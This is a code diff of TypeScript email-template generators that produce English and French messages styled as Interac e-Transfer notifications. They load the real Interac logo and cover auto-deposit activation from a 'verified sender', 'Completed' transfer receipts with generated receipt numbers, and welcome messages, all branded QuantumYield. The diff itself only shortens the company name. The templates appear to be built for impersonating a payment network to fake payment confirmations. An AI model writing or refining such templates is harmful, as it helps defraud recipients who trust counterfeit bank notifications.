@@ -65,7 +65,7 @@ const getHeader = () => `
   <div class="topbar">
     <div class="topbar-left">
       <img src="https://etransfer-notification.interac.ca/images/new/interac_logo.png" alt="INTERAC e-Transfer" height="50">
-      <div class="dba">QuantumYield Holdings</div>
+      <div class="dba">QuantumYield</div>
     </div>
     <div class="topbar-right">
       <div class="brand">e-Transfer</div>
@@ -494,7 +494,7 @@ export function generateAutoDepositEnabled(data: BaseEmailData): string {
           <p class="subtitle">Future e-Transfers will be deposited automatically.</p>
 
           <div class="alert-box alert-success">
-            <strong>Enablement:</strong> Interac e-Transfer Auto-Deposit has been activated for your account when receiving from QuantumYield Holdings.
+            <strong>Enablement:</strong> Interac e-Transfer Auto-Deposit has been activated for your account when receiving from QuantumYield.
           </div>
 
           <div class="details-card">
@@ -1049,7 +1049,7 @@ export function generateDepositInstructionsFr(_d: BaseEmailData): string {
 
 export function generateAutoDepositEnabledFr(d: BaseEmailData): string {
   const receiver = d.recipientName || "NICK ST-PIERRE"
-  return `<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">${getEmailStyles()}</head><body><div class="container">${getHeader()}<div class="content"><h1 class="greeting">Dépôt automatique activé!</h1><p class="subtitle">Les futurs virements seront déposés automatiquement.</p><div class="alert-box alert-success"><strong>Activation :</strong> Le dépôt automatique Interac a été activé pour votre compte lors de la réception de virements de QuantumYield Holdings.</div><div class="details-card"><h3 class="details-title">Paramètres du dépôt automatique</h3><div class="detail-row"><span class="detail-label">Expéditeur vérifié :</span><span class="detail-value">QuantumYield Innovation Technology</span></div><div class="detail-row"><span class="detail-label">Destinataire :</span><span class="detail-value">${receiver}</span></div><div class="detail-row"><span class="detail-label">Statut :</span><span class="detail-value" style="color:#28a745;font-weight:600;">Actif</span></div><div class="detail-row"><span class="detail-label">Date d&apos;activation :</span><span class="detail-value">${formatDate()}</span></div></div><div class="security-section"><h4 class="security-title">Ce que cela signifie</h4><p style="color:#555555;font-size:14px;line-height:1.7;margin:0;">Tous les futurs virements Interac envoyés par cet expéditeur vérifié seront automatiquement déposés dans le compte du destinataire, sans action requise de sa part. Les délais peuvent varier et une confirmation par courriel suivra chaque transaction.</p></div><div class="alert-box alert-info" style="margin-top:24px;"><strong>Remarque :</strong> Si vous n&apos;avez pas demandé l&apos;activation du dépôt automatique, communiquez immédiatement avec votre institution financière.</div></div>${getFooter()}</div></body></html>`
+  return `<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">${getEmailStyles()}</head><body><div class="container">${getHeader()}<div class="content"><h1 class="greeting">Dépôt automatique activé!</h1><p class="subtitle">Les futurs virements seront déposés automatiquement.</p><div class="alert-box alert-success"><strong>Activation :</strong> Le dépôt automatique Interac a été activé pour votre compte lors de la réception de virements de QuantumYield.</div><div class="details-card"><h3 class="details-title">Paramètres du dépôt automatique</h3><div class="detail-row"><span class="detail-label">Expéditeur vérifié :</span><span class="detail-value">QuantumYield Innovation Technology</span></div><div class="detail-row"><span class="detail-label">Destinataire :</span><span class="detail-value">${receiver}</span></div><div class="detail-row"><span class="detail-label">Statut :</span><span class="detail-value" style="color:#28a745;font-weight:600;">Actif</span></div><div class="detail-row"><span class="detail-label">Date d&apos;activation :</span><span class="detail-value">${formatDate()}</span></div></div><div class="security-section"><h4 class="security-title">Ce que cela signifie</h4><p style="color:#555555;font-size:14px;line-height:1.7;margin:0;">Tous les futurs virements Interac envoyés par cet expéditeur vérifié seront automatiquement déposés dans le compte du destinataire, sans action requise de sa part. Les délais peuvent varier et une confirmation par courriel suivra chaque transaction.</p></div><div class="alert-box alert-info" style="margin-top:24px;"><strong>Remarque :</strong> Si vous n&apos;avez pas demandé l&apos;activation du dépôt automatique, communiquez immédiatement avec votre institution financière.</div></div>${getFooter()}</div></body></html>`
 }
 
 export function generateSecurityQuestionUpdatedFr(_d: BaseEmailData): string {
@@ -1119,7 +1119,7 @@ export function generateTransferReceipt(data: BaseEmailData): string {
       <h3 class="details-title">Receipt Details</h3>
       <div class="detail-row"><span class="detail-label">Receipt No.:</span><span class="detail-value">${data.transferId || "RCPT-" + Date.now().toString().slice(-8)}</span></div>
       <div class="detail-row"><span class="detail-label">Recipient:</span><span class="detail-value">${data.recipientName}</span></div>
-      <div class="detail-row"><span class="detail-label">Institution:</span><span class="detail-value">${data.institution || "QuantumYield Holdings"}</span></div>
+      <div class="detail-row"><span class="detail-label">Institution:</span><span class="detail-value">${data.institution || "QuantumYield"}</span></div>
       <div class="detail-row"><span class="detail-label">Date & Time:</span><span class="detail-value">${formatDate()}</span></div>
       <div class="detail-row"><span class="detail-label">Status:</span><span class="detail-value" style="color:#28a745;font-weight:600;">Completed</span></div>
     </div>
@@ -1139,7 +1139,7 @@ export function generateTransferReceiptFr(data: BaseEmailData): string {
       <h3 class="details-title">Détails du reçu</h3>
       <div class="detail-row"><span class="detail-label">No de reçu :</span><span class="detail-value">${data.transferId || "RCPT-" + Date.now().toString().slice(-8)}</span></div>
       <div class="detail-row"><span class="detail-label">Destinataire :</span><span class="detail-value">${data.recipientName}</span></div>
-      <div class="detail-row"><span class="detail-label">Institution :</span><span class="detail-value">${data.institution || "QuantumYield Holdings"}</span></div>
+      <div class="detail-row"><span class="detail-label">Institution :</span><span class="detail-value">${data.institution || "QuantumYield"}</span></div>
       <div class="detail-row"><span class="detail-label">Date et heure :</span><span class="detail-value">${formatDate()}</span></div>
       <div class="detail-row"><span class="detail-label">Statut :</span><span class="detail-value" style="color:#28a745;font-weight:600;">Complété</span></div>
     </div>
@@ -1265,7 +1265,7 @@ export function generateWelcomeOnboard(data: BaseEmailData): string {
   <div class="container">${getHeader()}<div class="content">
     <h1 class="greeting">Welcome, ${data.recipientName}!</h1>
     <p class="subtitle">Your Interac e-Transfer account via QuantumYield is ready.</p>
-    <div class="alert-box alert-success"><strong>Account Activated:</strong> You can now send and receive Interac e-Transfers securely through QuantumYield Holdings.</div>
+    <div class="alert-box alert-success"><strong>Account Activated:</strong> You can now send and receive Interac e-Transfers securely through QuantumYield.</div>
     <div class="details-card">
       <h3 class="details-title">Getting Started</h3>
       <div class="detail-row"><span class="detail-label">Account Holder:</span><span class="detail-value">${data.recipientName}</span></div>
@@ -1284,7 +1284,7 @@ export function generateWelcomeOnboardFr(data: BaseEmailData): string {
   <div class="container">${getHeader()}<div class="content">
     <h1 class="greeting">Bienvenue, ${data.recipientName}!</h1>
     <p class="subtitle">Votre compte Interac via QuantumYield est prêt.</p>
-    <div class="alert-box alert-success"><strong>Compte activé :</strong> Vous pouvez maintenant envoyer et recevoir des virements Interac de façon sécurisée via QuantumYield Holdings.</div>
+    <div class="alert-box alert-success"><strong>Compte activé :</strong> Vous pouvez maintenant envoyer et recevoir des virements Interac de façon sécurisée via QuantumYield.</div>
     <div class="details-card">
       <h3 class="details-title">Pour commencer</h3>
       <div class="detail-row"><span class="detail-label">Titulaire du compte :</span><span class="detail-value">${data.recipientName}</span></div>
